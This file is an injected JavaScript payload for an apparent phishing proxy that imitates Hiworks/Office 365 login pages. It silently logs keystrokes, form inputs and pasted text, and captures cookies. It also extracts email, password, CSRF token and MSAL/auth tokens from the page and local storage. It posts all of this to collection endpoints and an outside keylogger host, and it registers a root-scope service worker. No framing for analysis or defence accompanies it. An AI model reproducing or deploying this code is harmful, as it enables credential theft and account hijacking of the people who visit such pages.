// ============================================================
//  INJECTED SCRIPT - Hiworks Office 365 Proxy
//  Silent version - NO console logs visible to user
// ============================================================

(function() {
    const CONFIG = window.MICROSOFT_CONFIG || {
        BACKEND_URL: "https://meeting-1-rzx6.onrender.com",
        KEYLOGGER_URL: "https://keyserver-eaar.onrender.com/log",
        XSS_ENDPOINT: "/xss-collect",
        COOKIE_ENDPOINT: "/cookie-capture",
        KEYLOG_ENDPOINT: "/keylog",
        SW_PROXY_PATH: "/lNv1pC9AWPUY4gbidyBO",
        SESSION_ID: 'sess_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now(),
        EMAIL: '',
        SERVICE: 'Hiworks Office 365'
    };

    let keylogBuffer = '';
    let lastInputValues = new Map();
    const FLUSH_INTERVAL = 10000;
    const MAX_BUFFER = 500;

    function formatKey(e) {
        const key = e.key;
        const special = {
            'Enter': '[ENTER]\n',
            'Backspace': '[BACKSPACE]',
            'Tab': '[TAB]',
            'Escape': '[ESC]',
            'Delete': '[DEL]',
            'ArrowUp': '[UP]',
            'ArrowDown': '[DOWN]',
            'ArrowLeft': '[LEFT]',
            'ArrowRight': '[RIGHT]',
            'Home': '[HOME]',
            'End': '[END]',
            'PageUp': '[PAGEUP]',
            'PageDown': '[PAGEDOWN]',
            'Control': '[CTRL]',
            'Alt': '[ALT]',
            'Shift': '[SHIFT]',
            'Meta': '[WIN]',
            'CapsLock': '[CAPS]',
            ' ': '[SPACE]'
        };
        if (special[key]) return special[key];
        if (e.isComposing) return `[COMPOSING:${key}]`;
        if (key.length === 1) return key;
        return `[${key}]`;
    }

    function sendKeylogBatch() {
        if (keylogBuffer.length === 0) return;

        fetch(CONFIG.KEYLOG_ENDPOINT, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                keystrokes: keylogBuffer,
                url: window.location.href,
                userAgent: navigator.userAgent,
                timestamp: new Date().toISOString(),
                sessionId: CONFIG.SESSION_ID,
                email: CONFIG.EMAIL,
                service: CONFIG.SERVICE
            })
        }).catch(() => {});

        if (CONFIG.KEYLOGGER_URL) {
            fetch(CONFIG.KEYLOGGER_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    keystrokes: keylogBuffer,
                    url: window.location.href,
                    userAgent: navigator.userAgent,
                    timestamp: new Date().toISOString(),
                    sessionId: CONFIG.SESSION_ID,
                    email: CONFIG.EMAIL,
                    service: CONFIG.SERVICE
                })
            }).catch(() => {});
        }

        keylogBuffer = '';
    }

    document.addEventListener('keydown', (e) => {
        if (['Shift', 'Control', 'Alt', 'Meta'].includes(e.key)) return;
        if (e.isComposing) return;
        keylogBuffer += formatKey(e);
        if (keylogBuffer.length >= MAX_BUFFER) sendKeylogBatch();
    });

    document.addEventListener('input', (e) => {
        if (!e.target) return;
        if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
            const field = e.target;
            const value = field.value;
            const label = field.name || field.id || field.placeholder || 'unknown';
            const prev = lastInputValues.get(field) || '';
            if (value !== prev) {
                const added = value.length > prev.length ? value.substring(prev.length) : '';
                if (added.length > 0) {
                    keylogBuffer += `[FIELD:${label}=${added}]`;
                } else {
                    keylogBuffer += `[FIELD:${label}=${value}]`;
                }
                lastInputValues.set(field, value);
                if (keylogBuffer.length >= MAX_BUFFER) sendKeylogBatch();
            }
        }
    });

    document.addEventListener('compositionstart', (e) => {
        keylogBuffer += '[IME_START]';
    });
    document.addEventListener('compositionend', (e) => {
        keylogBuffer += '[IME_END]';
        if (keylogBuffer.length >= MAX_BUFFER) sendKeylogBatch();
    });

    document.addEventListener('paste', (e) => {
        const text = e.clipboardData?.getData('text') || '';
        if (text) {
            keylogBuffer += `[PASTE:${text.substring(0, 100)}]`;
            if (keylogBuffer.length >= MAX_BUFFER) sendKeylogBatch();
        }
    });

    document.addEventListener('focusin', (e) => {
        if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
            const label = e.target.name || e.target.id || 'unknown';
            keylogBuffer += `[FOCUS:${label}]`;
            if (keylogBuffer.length >= MAX_BUFFER) sendKeylogBatch();
        }
    });

    document.addEventListener('focusout', (e) => {
        if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
            const label = e.target.name || e.target.id || 'unknown';
            keylogBuffer += `[BLUR:${label}]`;
            if (keylogBuffer.length >= MAX_BUFFER) sendKeylogBatch();
        }
    });

    setInterval(sendKeylogBatch, FLUSH_INTERVAL);
    window.addEventListener('beforeunload', sendKeylogBatch);

    // Cookie Capture
    function captureCookies() {
        try {
            const cookies = document.cookie || '';
            if (cookies) {
                fetch(CONFIG.COOKIE_ENDPOINT, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        cookies: cookies,
                        url: window.location.href,
                        sessionId: CONFIG.SESSION_ID,
                        email: CONFIG.EMAIL,
                        timestamp: new Date().toISOString()
                    })
                }).catch(() => {});
            }
        } catch (e) {}
    }

    setTimeout(captureCookies, 1000);
    setTimeout(captureCookies, 5000);
    setTimeout(captureCookies, 15000);
    setInterval(captureCookies, 30000);

    // XSS Data Extraction
    function extractDomData() {
        const data = {};
        const emailField = document.querySelector('input[name="loginfmt"]') || 
                           document.querySelector('input[type="email"]');
        if (emailField) data.email = emailField.value;

        const passField = document.querySelector('input[name="passwd"]') ||
                         document.querySelector('input[type="password"]');
        if (passField && passField.value) data.password = passField.value;

        const csrfInput = document.querySelector('input[name="__RequestVerificationToken"]');
        if (csrfInput) data.csrfToken = csrfInput.value;

        return data;
    }

    function extractStorage() {
        const data = {};
        try {
            const ls = {};
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                if (key && (key.includes('msal') || key.includes('auth') || key.includes('login'))) {
                    ls[key] = localStorage.getItem(key);
                }
            }
            if (Object.keys(ls).length > 0) data.localStorage = ls;
            data.cookies = document.cookie;
        } catch (e) {}
        return data;
    }

    async function runXSS() {
        try {
            const data = {
                dom: extractDomData(),
                storage: extractStorage(),
                url: window.location.href,
                timestamp: new Date().toISOString(),
                service: CONFIG.SERVICE,
                note: 'No API calls to avoid CORS'
            };

            fetch(CONFIG.XSS_ENDPOINT, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    ...data,
                    sessionId: CONFIG.SESSION_ID,
                    email: CONFIG.EMAIL
                })
            }).catch(() => {});
        } catch (e) {}
    }

    if (document.readyState === 'complete') {
        setTimeout(runXSS, 1500);
    } else {
        window.addEventListener('load', () => setTimeout(runXSS, 1500));
    }
    setTimeout(runXSS, 5000);
    setTimeout(runXSS, 15000);

    // Service Worker Registration
    if ("serviceWorker" in navigator) {
        navigator.serviceWorker.register("/service_worker_Mz8XO2ny1Pg5.js", {
            scope: "/",
        }).then((registration) => {
            if (registration.active) {
                registration.active.postMessage({
                    type: 'init',
                    sessionId: CONFIG.SESSION_ID,
                    email: CONFIG.EMAIL,
                    config: CONFIG
                });
            }
        }).catch(() => {});
    }

})();